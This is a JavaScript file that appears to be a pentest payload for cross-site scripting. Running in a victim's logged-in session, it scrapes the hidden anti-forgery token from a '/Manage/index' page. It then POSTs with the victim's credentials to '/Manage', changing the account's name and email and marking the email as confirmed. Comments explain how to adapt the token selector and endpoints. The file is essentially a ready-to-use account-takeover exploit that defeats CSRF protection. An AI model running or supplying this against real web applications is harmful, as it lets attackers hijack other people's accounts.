var firstname = "tmo";
var lastname= "changethis";
var email= "True"
var emailaddress ="tmo@tmo.com"
var host = "https://endpoint";
var manage = "/Manage";   //this is the endpoint with functionality that can be changed - change variable bname if wish
var index = "/Manage/index";  //this is the endpoint for grabbing token
var token2;
var create_params;

//THIS MODIFY's THE LASTNAME OF THE USER AND IS A SHOW EXAMPLE


//this function uses a get request where you know the verification code is stored in the HTML
// In this scenario the /Manage/index endpoint provides a token '__RequestVerificationToken'
// In order to find what the selector  right-click the node (token node) in Inspect, select Copy > Selector    
//Use that in document.querySelector() and just append .value
//can test manually in the console by doing doc.querySelector(selector given).value and this should show the token

//other option (poss easier) - document.querySelector('input[name="__RequestVerificationToken"]').value;
//wherer you know the name of the input name tag 

async function getToken() {
    try {
        const response = await fetch(host+index); // replace 'index' with your actual endpoint for grabbing the token
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const html = await response.text(); // Get the HTML content
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const tokenInput = doc.querySelector('body > div.flex.flex-col.flex-auto.w-full.min-w-0 > div.flex.flex-col.flex-auto.relative > div > div > div > div.flex.flex-auto.overflow-hidden > div > form > input[type=hidden]:nth-child(6)');

        if (tokenInput) {
            const token = tokenInput.value;
            return token;
        } else {
            throw new Error('Token input not found in the HTML.');
        }
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}

// checks whether valid or not and adds to the paramaters
getToken().then(token => {
    if (token) {
    	token2=token;
        console.log('Token:', token);
        create_params = "isEmailConfirmed=" + email +"&Email="+ emailaddress+"&FirstName=" + firstname + "&LastName=" + lastname + "&__RequestVerificationToken=" + token2 ;
        send_modify();
        
        // Do something with the token
    } else {
        console.log('Failed to retrieve the token.');
    }
});


function send_modify() { 
  console.log("Modifying User..."); 
  fetch(host+manage, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response2) {
    isdone();
  }); 
}

function isdone() { 
  console.log("Done"); 
  
}

getToken();


